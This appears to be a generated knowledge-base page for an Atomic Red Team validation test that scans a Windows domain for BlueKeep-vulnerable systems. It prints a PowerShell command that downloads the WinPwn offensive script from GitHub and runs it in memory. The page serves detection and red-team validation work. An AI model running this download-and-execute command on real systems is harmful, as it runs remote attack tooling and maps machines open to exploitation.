---
atomic_guid: "1cca5640-32a9-46e6-b8e0-fabbe2384a73"
title: "WinPwn - bluekeep"
framework: "atomic"
generated: "true"
attack_technique_id: "T1046"
attack_technique_name: "Network Service Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "1cca5640-32a9-46e6-b8e0-fabbe2384a73"
  - "WinPwn - bluekeep"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - bluekeep

Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).

## Metadata

- Atomic GUID: 1cca5640-32a9-46e6-b8e0-fabbe2384a73
- Technique: T1046: Network Service Discovery
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1046/T1046.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1046-network_service_discovery|T1046]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
bluekeep -noninteractive -consoleoutput
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.yaml)
